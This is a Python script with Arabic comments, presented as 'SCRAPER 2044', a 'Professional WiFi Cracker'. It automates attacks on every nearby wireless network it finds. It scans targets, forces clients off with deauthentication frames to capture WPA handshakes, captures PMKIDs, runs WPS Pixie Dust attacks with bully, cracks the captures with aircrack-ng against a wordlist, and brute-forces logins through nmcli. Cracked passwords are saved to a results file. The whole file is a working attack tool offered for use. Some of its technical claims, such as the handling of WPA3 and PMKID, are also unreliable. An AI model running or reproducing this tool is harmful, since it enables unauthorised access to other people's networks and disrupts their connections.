#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  🔥  SCRAPER 2044 v3.0 - Professional WiFi Cracker                     ║
║  يدعم: WPA/WPA2/WPA3 | PMKID | WPS Pixie | Handshake Capture           ║
║  أنت ترفع ملف الباسوردات - لا يوجد أي كلمة مرور مدمجة                ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import re
import subprocess
import threading
import signal
import socket
import hashlib
import binascii
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import OrderedDict

# ============================================================
# 1. الإعدادات الأساسية
# ============================================================
VERSION = "3.0"
PASSWORDS_FILE = "passwords.txt"
RESULTS_FILE = "cracked_results.json"
HANDSHAKE_DIR = "handshakes"
LOG_FILE = "scraper.log"
CONFIG_FILE = "scraper_config.json"

# إعدادات متقدمة
MAX_THREADS = 4
TIMEOUT_PER_ATTEMPT = 10
SCAN_TIMEOUT = 30
WPS_TIMEOUT = 120

# ألوان للطباعة (ANSI)
COLORS = {
    'RED': '\033[91m',
    'GREEN': '\033[92m',
    'YELLOW': '\033[93m',
    'BLUE': '\033[94m',
    'MAGENTA': '\033[95m',
    'CYAN': '\033[96m',
    'WHITE': '\033[97m',
    'BOLD': '\033[1m',
    'RESET': '\033[0m'
}

def cprint(text, color='WHITE', bold=False):
    """طباعة ملونة"""
    prefix = COLORS['BOLD'] if bold else ''
    print(f"{prefix}{COLORS.get(color, COLORS['WHITE'])}{text}{COLORS['RESET']}")

# ============================================================
# 2. إدارة السجلات والإعدادات
# ============================================================
def log(msg, level="INFO"):
    """تسجيل في ملف السجل"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] [{level}] {msg}\n")

def load_config():
    """تحميل الإعدادات من ملف"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"interface": "wlan0", "max_threads": 4, "timeout": 10}

def save_config(config):
    """حفظ الإعدادات"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

# ============================================================
# 3. تحميل الباسوردات (من ملف المستخدم)
# ============================================================
def load_passwords(filepath):
    """تحميل الباسوردات من ملف يرفعه المستخدم - بدون أي كلمات مدمجة"""
    if not os.path.exists(filepath):
        return []
    
    passwords = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                pwd = line.strip()
                if pwd and len(pwd) >= 6 and len(pwd) <= 64:
                    passwords.append(pwd)
        
        # إزالة التكرار مع الحفاظ على الترتيب
        passwords = list(OrderedDict.fromkeys(passwords))
        log(f"تم تحميل {len(passwords)} كلمة مرور من {filepath}")
        return passwords
    except Exception as e:
        log(f"خطأ في تحميل الباسوردات: {e}", "ERROR")
        return []

# ============================================================
# 4. اكتشاف واجهة الشبكة
# ============================================================
def detect_interface():
    """اكتشاف واجهة الواي فاي المتاحة"""
    try:
        result = subprocess.run(
            ["iwconfig"], capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if "IEEE 802.11" in line:
                iface = line.split()[0]
                log(f"تم اكتشاف الواجهة: {iface}")
                return iface
    except Exception as e:
        log(f"فشل اكتشاف الواجهة: {e}", "WARN")
    
    # محاولة بديلة
    try:
        result = subprocess.run(
            ["ip", "link", "show"], capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if "wlan" in line and "state UP" in line:
                iface = line.split(":")[1].strip()
                log(f"تم اكتشاف الواجهة (ip): {iface}")
                return iface
    except:
        pass
    
    return "wlan0"  # افتراضي

# ============================================================
# 5. مسح الشبكات المتقدمة (airodump-ng / nmcli / wash)
# ============================================================
def scan_networks_airodump(interface, timeout=30):
    """مسح باستخدام airodump-ng (الأفضل للاختراق)"""
    networks = []
    temp_file = "/tmp/airodump_scan"
    
    try:
        # تشغيل airodump-ng
        cmd = [
            "timeout", str(timeout),
            "airodump-ng", "-w", temp_file, "--output-format", "csv",
            interface
        ]
        subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
        
        # قراءة النتائج من ملف CSV
        csv_file = temp_file + "-01.csv"
        if os.path.exists(csv_file):
            with open(csv_file, 'r', errors='ignore') as f:
                for line in f:
                    if "WPA" in line or "WPA2" in line or "WEP" in line:
                        parts = re.split(r',\s*', line.strip())
                        if len(parts) >= 14:
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            encryption = parts[5].strip() if len(parts) > 5 else "Unknown"
                            # محاولة استخراج SSID (قد يكون في العمود الأخير)
                            ssid = parts[-1].strip() if len(parts) > 1 else "Hidden"
                            if ssid and ssid not in ["", "(not associated)"]:
                                networks.append({
                                    "ssid": ssid,
                                    "bssid": bssid,
                                    "channel": channel,
                                    "encryption": encryption,
                                    "wps": "Unknown"
                                })
            os.remove(csv_file)
        # تنظيف الملفات المؤقتة
        for f in [temp_file + "-01.csv", temp_file + "-01.kismet"]:
            if os.path.exists(f):
                os.remove(f)
        log(f"airodump-ng: تم العثور على {len(networks)} شبكة")
    except Exception as e:
        log(f"airodump-ng فشل: {e}", "WARN")
    
    return networks

def scan_networks_nmcli():
    """مسح باستخدام nmcli (بديل سريع)"""
    networks = []
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SECURITY", "dev", "wifi", "list"],
            capture_output=True, text=True, timeout=15
        )
        for line in result.stdout.splitlines():
            if line and ":" in line:
                parts = line.split(":", 3)
                if len(parts) >= 4:
                    ssid = parts[0].strip()
                    bssid = parts[1].strip() if len(parts) > 1 else ""
                    channel = parts[2].strip() if len(parts) > 2 else ""
                    security = parts[3].strip() if len(parts) > 3 else ""
                    if ssid and ssid not in ["--", ""]:
                        networks.append({
                            "ssid": ssid,
                            "bssid": bssid,
                            "channel": channel,
                            "encryption": security,
                            "wps": "Unknown"
                        })
        log(f"nmcli: تم العثور على {len(networks)} شبكة")
    except Exception as e:
        log(f"nmcli فشل: {e}", "WARN")
    return networks

def scan_wps(interface):
    """فحص شبكات WPS باستخدام wash"""
    wps_networks = []
    try:
        result = subprocess.run(
            ["wash", "-i", interface, "-C"],
            capture_output=True, text=True, timeout=20
        )
        for line in result.stdout.splitlines():
            if "WPS" in line and "Locked" not in line:
                parts = line.split()
                if len(parts) >= 2:
                    bssid = parts[0] if parts[0].count(":") == 5 else ""
                    if bssid:
                        wps_networks.append(bssid)
        log(f"wash: تم العثور على {len(wps_networks)} شبكة WPS")
    except Exception as e:
        log(f"wash فشل: {e}", "WARN")
    return wps_networks

def scan_networks_combined(interface):
    """مسح شامل بجميع الأدوات المتاحة"""
    cprint("\n[*] بدء المسح الشامل للشبكات...", "CYAN")
    networks = []
    
    # 1. airodump-ng
    net1 = scan_networks_airodump(interface, 25)
    networks.extend(net1)
    
    # 2. nmcli
    net2 = scan_networks_nmcli()
    # دمج مع تجنب التكرار
    existing_ssids = [n["ssid"] for n in networks]
    for n in net2:
        if n["ssid"] not in existing_ssids:
            networks.append(n)
    
    # 3. فحص WPS
    wps_bssids = scan_wps(interface)
    for n in networks:
        if n["bssid"] in wps_bssids:
            n["wps"] = "Available"
    
    # 4. محاولة الحصول على معلومات إضافية عبر airodump
    for n in networks:
        if n["bssid"] and n["bssid"] != "":
            try:
                result = subprocess.run(
                    ["airodump-ng", "--bssid", n["bssid"], interface],
                    capture_output=True, text=True, timeout=5
                )
                if "WPA3" in result.stdout:
                    n["encryption"] = "WPA3"
            except:
                pass
    
    log(f"إجمالي الشبكات المكتشفة: {len(networks)}")
    return networks

# ============================================================
# 6. التقاط Handshake
# ============================================================
def capture_handshake(interface, bssid, channel, ssid, timeout=60):
    """التقاط مصافحة WPA/WPA2"""
    handshake_file = f"{HANDSHAKE_DIR}/handshake_{bssid.replace(':', '')}"
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    
    try:
        # ضبط القناة
        subprocess.run(["iwconfig", interface, "channel", channel], capture_output=True, timeout=2)
        
        # تشغيل airodump-ng للتقاط المصافحة
        cmd = [
            "timeout", str(timeout),
            "airodump-ng", "-c", channel, "--bssid", bssid,
            "-w", handshake_file, "--output-format", "cap",
            interface
        ]
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # هجوم deauth لتعجيل المصافحة
        time.sleep(5)
        deauth_cmd = [
            "aireplay-ng", "-0", "5", "-a", bssid,
            interface
        ]
        subprocess.run(deauth_cmd, capture_output=True, timeout=5)
        
        process.wait(timeout=timeout)
        
        # التحقق من وجود المصافحة
        cap_file = handshake_file + "-01.cap"
        if os.path.exists(cap_file) and os.path.getsize(cap_file) > 1000:
            # تحقق باستخدام aircrack-ng
            check = subprocess.run(
                ["aircrack-ng", cap_file, "-l", "/dev/null"],
                capture_output=True, text=True, timeout=5
            )
            if "1 handshake" in check.stdout or "1 PMKID" in check.stdout:
                log(f"تم التقاط المصافحة لـ {ssid}")
                return cap_file
    except Exception as e:
        log(f"فشل التقاط المصافحة لـ {ssid}: {e}", "ERROR")
    
    return None

# ============================================================
# 7. هجوم PMKID (لشبكات WPA3)
# ============================================================
def capture_pmkid(interface, bssid, channel, ssid, timeout=30):
    """التقاط PMKID لشبكات WPA3"""
    try:
        subprocess.run(["iwconfig", interface, "channel", channel], capture_output=True, timeout=2)
        cmd = [
            "hcxdumptool", "-i", interface, "-o", f"/tmp/pmkid_{bssid.replace(':', '')}.pcap",
            "--enable_status=1", "-t", str(timeout)
        ]
        subprocess.run(cmd, capture_output=True, timeout=timeout + 5)
        
        pcap_file = f"/tmp/pmkid_{bssid.replace(':', '')}.pcap"
        if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 100:
            # تحويل إلى hccapx
            hccapx_file = f"/tmp/pmkid_{bssid.replace(':', '')}.hccapx"
            subprocess.run(
                ["hcxpcapngtool", "-o", hccapx_file, pcap_file],
                capture_output=True, timeout=5
            )
            if os.path.exists(hccapx_file):
                log(f"تم التقاط PMKID لـ {ssid}")
                return hccapx_file
    except Exception as e:
        log(f"فشل PMKID لـ {ssid}: {e}", "WARN")
    return None

# ============================================================
# 8. هجوم WPS Pixie Dust
# ============================================================
def wps_pixie_attack(interface, bssid, ssid, timeout=60):
    """هجوم WPS باستخدام Pixie Dust"""
    try:
        cmd = [
            "bully", "-b", bssid, "-e", ssid, "-v", "3",
            interface
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = result.stdout + result.stderr
        
        # البحث عن كلمة المرور في المخرجات
        patterns = [
            r'PIN:\s*(\d{8})',
            r'PSK:\s*([^\s]+)',
            r'Password:\s*([^\s]+)',
            r'WPA PSK:\s*([^\s]+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, output, re.IGNORECASE)
            if match:
                pwd = match.group(1).strip()
                if len(pwd) >= 6:
                    log(f"Pixie Dust نجح لـ {ssid}: {pwd}")
                    return pwd
    except Exception as e:
        log(f"Pixie Dust فشل لـ {ssid}: {e}", "WARN")
    return None

# ============================================================
# 9. هجوم باستخدام ملف الباسوردات (aircrack-ng)
# ============================================================
def crack_with_aircrack(handshake_file, password_file):
    """استخدام aircrack-ng لاختراق المصافحة"""
    if not handshake_file or not os.path.exists(handshake_file):
        return None
    if not os.path.exists(password_file) or os.path.getsize(password_file) == 0:
        return None
    
    try:
        cmd = ["aircrack-ng", handshake_file, "-w", password_file, "-l", "/tmp/found.txt"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        
        # البحث عن كلمة المرور
        match = re.search(r'KEY FOUND!\s*\[([^\]]+)\]', output, re.IGNORECASE)
        if match:
            pwd = match.group(1).strip()
            return pwd
        
        # محاولة بديلة
        if os.path.exists("/tmp/found.txt"):
            with open("/tmp/found.txt", 'r') as f:
                pwd = f.read().strip()
                if pwd:
                    return pwd
    except Exception as e:
        log(f"aircrack-ng فشل: {e}", "ERROR")
    return None

# ============================================================
# 10. الهجوم الرئيسي على شبكة واحدة
# ============================================================
def attack_single_network(interface, network, passwords):
    """هجوم شامل على شبكة واحدة بجميع الطرق"""
    ssid = network["ssid"]
    bssid = network["bssid"]
    channel = network["channel"]
    encryption = network["encryption"]
    wps = network.get("wps", "Unknown")
    
    cprint(f"\n[*] استهداف: {ssid} ({bssid}) - {encryption}", "YELLOW")
    result = {
        "ssid": ssid,
        "bssid": bssid,
        "channel": channel,
        "encryption": encryption,
        "password": None,
        "method": None,
        "status": "failed",
        "time": datetime.now().isoformat()
    }
    
    # 1. محاولة WPS Pixie Dust
    if wps == "Available":
        cprint(f"   [*] محاولة WPS Pixie Dust...", "BLUE")
        pwd = wps_pixie_attack(interface, bssid, ssid)
        if pwd:
            result["password"] = pwd
            result["method"] = "WPS_Pixie"
            result["status"] = "cracked"
            cprint(f"   ✅ WPS نجح: {pwd}", "GREEN")
            return result
    
    # 2. محاولة PMKID (لشبكات WPA3)
    if "WPA3" in encryption:
        cprint(f"   [*] محاولة PMKID...", "BLUE")
        pmkid_file = capture_pmkid(interface, bssid, channel, ssid, 20)
        if pmkid_file:
            pwd = crack_with_aircrack(pmkid_file, PASSWORDS_FILE)
            if pwd:
                result["password"] = pwd
                result["method"] = "PMKID"
                result["status"] = "cracked"
                cprint(f"   ✅ PMKID نجح: {pwd}", "GREEN")
                return result
    
    # 3. التقاط Handshake
    cprint(f"   [*] محاولة التقاط المصافحة...", "BLUE")
    handshake_file = capture_handshake(interface, bssid, channel, ssid, 45)
    if handshake_file:
        cprint(f"   [*] محاولة اختراق المصافحة...", "BLUE")
        pwd = crack_with_aircrack(handshake_file, PASSWORDS_FILE)
        if pwd:
            result["password"] = pwd
            result["method"] = "Handshake"
            result["status"] = "cracked"
            cprint(f"   ✅ المصافحة نجحت: {pwd}", "GREEN")
            return result
    
    # 4. محاولة مباشرة عبر nmcli (اختبار سريع)
    cprint(f"   [*] محاولة الاتصال المباشر...", "BLUE")
    for pwd in passwords[:100]:  # فقط أول 100 كلمة للسرعة
        try:
            cmd = ["nmcli", "device", "wifi", "connect", ssid, "password", pwd]
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if "successfully" in out.stdout.lower() or "activated" in out.stdout.lower():
                result["password"] = pwd
                result["method"] = "Direct_Connect"
                result["status"] = "cracked"
                cprint(f"   ✅ اتصال مباشر نجح: {pwd}", "GREEN")
                return result
        except:
            pass
    
    cprint(f"   ❌ فشل اختراق {ssid}", "RED")
    return result

# ============================================================
# 11. الهجوم الرئيسي (متعدد الخيوط)
# ============================================================
def attack_all_networks(interface, networks, passwords):
    """هجوم على جميع الشبكات باستخدام خيوط متعددة"""
    cprint(f"\n🔥 بدء الهجوم على {len(networks)} شبكة...", "MAGENTA", True)
    log(f"بدء الهجوم على {len(networks)} شبكة")
    
    results = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {
            executor.submit(attack_single_network, interface, net, passwords): net
            for net in networks
        }
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                log(f"خطأ في تنفيذ الهجوم: {e}", "ERROR")
    
    # حفظ النتائج
    save_results(results)
    
    # عرض الملخص
    cracked = [r for r in results if r["status"] == "cracked"]
    cprint(f"\n{'='*60}", "CYAN")
    cprint(f"📊  ملخص النتائج", "WHITE", True)
    cprint(f"   - إجمالي الشبكات: {len(results)}", "CYAN")
    cprint(f"   - مخترقة: {len(cracked)}", "GREEN" if cracked else "RED")
    cprint(f"   - فاشلة: {len(results) - len(cracked)}", "YELLOW")
    cprint(f"   - النتائج محفوظة في: {RESULTS_FILE}", "CYAN")
    
    if cracked:
        cprint(f"\n🔑  الشبكات المخترقة:", "GREEN", True)
        for r in cracked:
            cprint(f"   ✅ {r['ssid']} -> {r['password']} ({r['method']})", "GREEN")
    
    return results

# ============================================================
# 12. حفظ النتائج
# ============================================================
def save_results(results):
    """حفظ النتائج في ملف JSON"""
    try:
        with open(RESULTS_FILE, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        log(f"تم حفظ النتائج في {RESULTS_FILE}")
    except Exception as e:
        log(f"فشل حفظ النتائج: {e}", "ERROR")

# ============================================================
# 13. التحقق من التبعيات
# ============================================================
def check_dependencies():
    """التحقق من وجود الأدوات المطلوبة"""
    tools = [
        "airodump-ng", "aireplay-ng", "aircrack-ng",
        "wash", "bully", "hcxdumptool", "hcxpcapngtool",
        "nmcli", "iwconfig", "iwlist"
    ]
    missing = []
    for tool in tools:
        try:
            subprocess.run(["which", tool], capture_output=True, check=True)
        except:
            missing.append(tool)
    
    if missing:
        cprint(f"\n⚠️  الأدوات المفقودة:", "YELLOW")
        for m in missing:
            cprint(f"   - {m}", "YELLOW")
        cprint(f"\nلتثبيتها:", "CYAN")
        cprint("   sudo apt install aircrack-ng reaver bully hcxtools nmcli", "CYAN")
        cprint("   أو: sudo apt install aircrack-ng reaver bully hcxtools wireless-tools", "CYAN")
        return False
    return True

# ============================================================
# 14. الواجهة الرئيسية
# ============================================================
def main_menu():
    """القائمة الرئيسية"""
    cprint(f"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  🔥  SCRAPER 2044 v{VERSION} - Professional WiFi Cracker                 ║
║  يدعم: WPA/WPA2/WPA3 | PMKID | WPS Pixie Dust | Handshake               ║
║  أنت ترفع ملف الباسوردات - لا يوجد أي كلمة مرور مدمجة                  ║
╚═══════════════════════════════════════════════════════════════════════════╝
    """, "CYAN", True)
    
    # التحقق من التبعيات
    if not check_dependencies():
        cprint("\n[!] قم بتثبيت الأدوات المفقودة قبل المتابعة.", "RED")
        return
    
    # تحميل الإعدادات
    config = load_config()
    interface = config.get("interface", detect_interface())
    global MAX_THREADS, PASSWORDS_FILE
    MAX_THREADS = config.get("max_threads", 4)
    
    cprint(f"[*] الواجهة المستخدمة: {interface}", "CYAN")
    cprint(f"[*] عدد الخيوط: {MAX_THREADS}", "CYAN")
    
    # تحميل الباسوردات
    cprint(f"\n📂  تحميل ملف الباسوردات", "YELLOW", True)
    cprint(f"   ضع ملفك في نفس المجلد باسم 'passwords.txt'", "WHITE")
    cprint(f"   أو اختر مساراً مختلفاً.", "WHITE")
    
    choice = input(f"\n[1] استخدام passwords.txt في المجلد الحالي\n[2] تحديد مسار آخر\n[3] خروج\nاختر: ").strip()
    
    passwords = []
    if choice == "1":
        passwords = load_passwords(PASSWORDS_FILE)
    elif choice == "2":
        path = input("أدخل المسار الكامل للملف: ").strip()
        if path:
            PASSWORDS_FILE = path
            passwords = load_passwords(path)
    else:
        cprint("[+] خروج.", "GREEN")
        return
    
    if not passwords:
        cprint("[-] لا توجد كلمات مرور صالحة. تأكد من الملف.", "RED")
        return
    
    cprint(f"[+] تم تحميل {len(passwords)} كلمة مرور.", "GREEN")
    
    # رفع الواجهة إلى وضع المراقبة
    cprint(f"\n[+] رفع الواجهة {interface} إلى وضع المراقبة...", "CYAN")
    try:
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], capture_output=True)
        subprocess.run(["sudo", "iwconfig", interface, "mode", "monitor"], capture_output=True)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], capture_output=True)
        cprint("[+] تم رفع الواجهة بنجاح.", "GREEN")
    except:
        cprint("[!] فشل رفع الواجهة. قد تحتاج صلاحيات root.", "YELLOW")
    
    # مسح الشبكات
    cprint(f"\n📡  بدء مسح الشبكات...", "YELLOW", True)
    networks = scan_networks_combined(interface)
    
    if not networks:
        cprint("[-] لم يتم العثور على شبكات.", "RED")
        return
    
    cprint(f"\n[+] تم العثور على {len(networks)} شبكة:", "GREEN")
    for i, n in enumerate(networks, 1):
        wps_info = f" [WPS: {n['wps']}]" if n.get('wps') == "Available" else ""
        cprint(f"   {i}. {n['ssid']} ({n['bssid']}) - {n['encryption']}{wps_info}", "WHITE")
    
    # تأكيد الهجوم
    confirm = input(f"\n🔥 هل تريد بدء الهجوم على جميع الشبكات؟ (y/n): ").strip().lower()
    if confirm != 'y':
        cprint("[+] تم الإلغاء.", "GREEN")
        return
    
    # بدء الهجوم
    results = attack_all_networks(interface, networks, passwords)
    
    # حفظ النتائج في JSON
    save_results(results)
    
    # العودة إلى الوضع العادي
    try:
        subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"], capture_output=True)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], capture_output=True)
    except:
        pass

# ============================================================
# 15. معالجة الإشارات
# ============================================================
def signal_handler(sig, frame):
    cprint("\n\n[+] تم الإيقاف بواسطة المستخدم.", "YELLOW")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ============================================================
# 16. التشغيل الرئيسي
# ============================================================
def main():
    # التحقق من الصلاحيات
    if os.geteuid() != 0:
        cprint("\n⚠️  هذا البرنامج يحتاج صلاحيات root.", "YELLOW")
        cprint("   قم بتشغيل: sudo python3 scraper.py", "CYAN")
        # نستمر ولكن مع تحذير
    
    try:
        main_menu()
    except KeyboardInterrupt:
        cprint("\n[+] تم الإيقاف.", "YELLOW")
    except Exception as e:
        cprint(f"\n[-] خطأ غير متوقع: {e}", "RED")
        log(f"خطأ غير متوقع: {e}", "ERROR")

if __name__ == "__main__":
    main()
